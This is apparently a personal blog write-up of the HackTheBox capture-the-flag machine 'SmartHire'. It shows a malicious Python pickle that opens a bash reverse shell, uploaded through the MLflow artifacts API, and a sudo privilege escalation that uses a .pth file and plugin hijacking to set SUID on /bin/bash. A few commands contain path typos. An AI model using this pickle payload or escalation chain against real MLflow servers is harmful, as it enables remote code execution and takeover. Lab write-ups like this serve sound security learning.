+++
title = "SmartHire - Executing malicious code through an AI model"
date = 2026-06-04T14:19:11Z
tags = ["HTB - Medium", "Linux", "Pentesting"]
description = "Pwning the SmartHire machine from HTB."
+++
## **OVERVIEW**
*SmartHire* is a medium-rated Linux machine on the HackTheBox platform. Breaking into the machine requires web enumeration to find a vulnerable subdomain, malicious pickle file upload to modify an AI model into a reverse shell, and privilege escalation through Python path manipulation.
## **RECON**
After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nmap -sS -oN nmap_scan.txt 10.129.245.215                     
```
The scan revealed two open TCP ports for SSH and HTTP (UDP scans did not reveal any open ports):
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 12:28 PDT
Nmap scan report for 10.129.245.215
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)
|_  256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 11:36:12 2026 -- 1 IP address (1 host up) scanned in 33.82 seconds
```
The scan revealed the domain name, **smarthire.htb**, which I added to my **/etc/hosts** file. I visited the site in my web browser and was met with this webpage:  
![smarthire landing page](/images/smarthire/landing.png)
The website appeared to be hosting an AI resume reviewing service. Without wasting time, I began the enumeration process.
## **ENUMERATION**
While traversing the site, I wasn't able to find any interesting endpoints besides the **sign in** page.  
![login page](/images/smarthire/signin.png) 
Trying default credentials didn't let me get anywhere, so I went ahead and created an account using my name. I got sent to a **dashboard panel**, which allowed me to upload **.csv** files to train an AI model to use for resume reviewing.  
![dashboard](/images/smarthire/dashboard.png)
First, I copied the example .csv data that the website gave me, put it into a .csv file, and uploaded it to see how the service worked. Basically, the site takes a .csv file that has a list of job candidates and their skills.  
&nbsp;  
Then, you upload a separate .csv file that contains a list of skills and experience that you want from the candidates. The AI model then creates "overall fit scores" for the candidates so you can see who would be the best fit for your job opening.  
&nbsp;  
I thought this could potentially be a **file upload vulnerability**, but after trying a variety of altered **.csv** files with reverse shell scripts, I ultimately made no progress.  
&nbsp;  
So, I figured that I'd look elsewhere. I performed a directory scan using gobuster and fuzzed the URL for subdomains:
```bash
gobuster dir -u "http://smarthire.htb" -w ../Seclists/Discovery/Web-Content/big.txt -t 25 -timeout 20s
```
```bash
ffuf -u "http://smarthire.htb" -H "Host: FUZZ.smarthire.htb" -w ../Seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```
Gobuster didn't reveal any endpoints outside of the ones I already discovered, however, the **ffuf** scan revealed a promising subdomain at **models.smarthire.htb**  
&nbsp;  
I added the subdomain to my **/etc/hosts** file and visited it in my browser:  
![admin login](/images/smarthire/login.png)
The site prompted me to login, so I went ahead and tried a variety of default admin credentials. Using **admin** for the username and **password** for the password allowed me to get in!  
&nbsp;  
I got introduced to another dashboard, this time it was an **admin panel** for **MLflow**. It also revealed the **version number** running on the site, **MLflow 2.14.1**.
![admin panel](/images/smarthire/admin.png)
From here I was able to see the AI model that I trained earlier, the one where I used the example .csv data that the website provided. Clicking on it brought me to this page:
![ai model](/images/smarthire/model.png)
The **artifacts** tab was the most interesting, as it revealed the code used to build the model.
![artifacts](/images/smarthire/artifacts.png)
I started thinking that if I was able to modify the model, I'd be able to get a reverse shell going. I wanted to do some research on the **MLflow version** to see if there was already any known exploits or vulnerabilities tied to that idea.  
&nbsp;  
I found out that this specific version was vulnerable to **CVE-2024-37058**, which allowed for untrusted deserialization of malicious code. This meant that if I was able to alter the source code of the model with a **reverse shell script**, it *wouldn't* conduct any sanitization. From there, I could trigger the payload by running the model through my user dashboard.  
&nbsp;  
The main point of interest was the **python_model.pkl** file, a pickle file that was responsible for storing the model.  
&nbsp;  
There was just one problem... there was no way for me to edit the model from the dashboard! No *upload* button, *modify* setting, anything. So, I had to do some digging on the MLflow documentation to see if my idea was even possible.  
&nbsp;  
After some time, I found documentation on the **MLflow REST API**. It showed which URL to make **curl requests** to:
![documentation](/images/smarthire/doc.png)
Digging deeper into the documentation revealed how to write a **PUT** request in order to update the **artifacts** of the model, which *contained* the **.pkl** file I was trying to modify!  
![more documentation](/images/smarthire/upload.png)
Now that I knew where to make **PUT** requests to, I needed to craft a payload. I used this script to generate a malicious pickle file, which I'd use to replace the original pickle file that the model uses:  
```python
import pickle, os

class Shell:
    def __reduce__(self):
        cmd = "bash -i >& /dev/tcp/10.10.16.192/4444 0>&1"
        return (os.system, (f"bash -c '{cmd}'",))

with open("python_model.pkl", "wb") as f:
    pickle.dump(Shell(), f)
```
The script uses the **__reduce__** method which tells Python *how* to reconstruct the object, **Shell**, when deserializing. Then, it serializes the **Shell** object into binary format.  
&nbsp;  
All I needed to do was run it to compile it:  
```bash
python3 bad_pickle.py
```
Then upload the **python_model.pkl** file that had been generated using **curl**:  
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# curl -X PUT "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/9767cc9db15a45868d72f02f9f6b338c/artifacts/model/python_model.pkl" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @python_model.pkl \
  -u admin:password
```
The curl command returned an empty response, which meant that the file had been uploaded successfully. Now, all I needed to do was set up a listener on my attacker machine, and go back to my user dashboard on **smarthire.htb** to get the model to run.  
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nc -lvnp 4444  
listening on [any] 4444 ...
```
I went to the **smarthire.htb/predict** endpoint to run the model, this is the part of the site that takes a .csv file containing the desired skills you want from a job candidate and feeds it to the AI model.  
&nbsp;  
I used the .csv file containing the example data shown on the website, nothing special. Clicking the **Analyze Resume** button *did* do something special though...
![analyzing](/images/smarthire/analyzing.png)
```bash
┌──(root㉿kali)-[/home/esteban/HackTheBox]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.192] from (UNKNOWN) [10.129.245.215] 42556
bash: cannot set terminal process group (1018): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ whoami
whoami
svcweb
```
Just like that we got ourselves a...
## **FOOTHOLD**
I went ahead and cleaned up the terminal and grabbed the **user.txt** flag at **/home/svcweb**:
```bash
svcweb@smarthire:~$ ls
user.txt
svcweb@smarthire:~$ cat user.txt
df81a2d57e30d8bafe10418c0205a01f
```
 Now that the user flag was out the way, I got straight to enumerating. Checking for SUID binaries, capabilities, and crontabs didn't show anything out of the ordinary, however, running **sudo -l** had a very interesting output:
```bash
svcweb@smarthire:~$ sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```
The **svcweb** user I was running on had the ability to run the **mlflowctl.py** script as **root**, so I wasted no time checking out that script:
```python
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```
The script was used for checking the status of the MLflow server, backing up MLflow models, and restarting the MLflow service. It imported its plugins from the **/opt/tools/mlflow_ctl/plugins** directory, which contained two directories: **core** and **dev**.  
&nbsp;  
The script used the **iterdir()** Python function, which always chose the **core** directory to look for plugins over **dev**, since it came first in alphabetical order.  
&nbsp;  
The **core** directory in the plugins folder contained **backup_models.py** and **mlflow_actions.py**, and my first instinct was to try to modify them but both were unwriteable.  
&nbsp;  
However, the **dev** directory in **plugins** was free game. I could write files as I please. I knew that if I was able to create a *malicious* version of the **backup_models.py** or **mlflow_actions.py**, I'd be golden. The problem was figuring out how to get the **mlflowctl.py** script to choose the **dev** directory before the **core** directory.  
&nbsp;  
I circled back to the script that my user was able to run as root and took a deeper look into this piece of code:
```python
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```
I did some Python function research, and found out that the **site.addsitedir()** function processes **.pth** files inside of a specified directory (that directory being **plugins**). If those **.pth** files begin with an **import** statement, it will get executed as Python code. So, if I made a malicious **.pth** file in **dev** that contained code to rewrite its index, I'd theoretically be able to make the **iterdir()** function grab plugins from **dev** instead of **core**.  
&nbsp;  
That was kind of alot. Enough talking though, let's see if it works.
## **PRIVESC**
```bash
# First step was to write a path file with an import statement, which would specify the index of the "dev" directory:
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/core$ cat > /op/plugins/dev/exploit.pth << 'EOF'
> import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
> EOF
```
```bash
# Then, I needed to create a malicious "mlflow_actions.py" script for the "mlflowctl.py" script to call:
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/core$ cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os
def check_status():
    os.system("chmod +s /bin/bash")
def restart():
    os.system("chmod +s /bin/bash")
EOF
```
```bash
# All that needed to be done at this point was run the NOPASSWD command to run the exploit:
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/core$ sudo /usrpt/tools/mlflow_ctl/mlflowctl.py status
svcweb@smarthire:/opt/tools/mlflow_ctl/plugins/core$ bash -p
root@smarthire:/opt/tools/mlflow_ctl/plugins/core# whoami
root
```
And just like that, we got root! I went ahead and grabbed the **root.txt** flag from **/root**:
```bash
root@smarthire:/root# ls
root.txt  scripts
root@smarthire:/root# cat root.txt
9a158c619a55bc6ff1c46d42309f7bb9
```
## **TAKEAWAYS**
This machine helped me understand how *detrimental* untrusted deserialization can be. Uploading a malicious pickle file to replace the original pickle from the AI model is what got me that initial foothold. The privesc I had to do for this machine was also a great learning experience, I had to learn more about how the **site.addsitedir()** function worked in order to leverage the vulnerable script. All in all, a fun machine and great reminder to keep your code sanitized and Python scripts secure.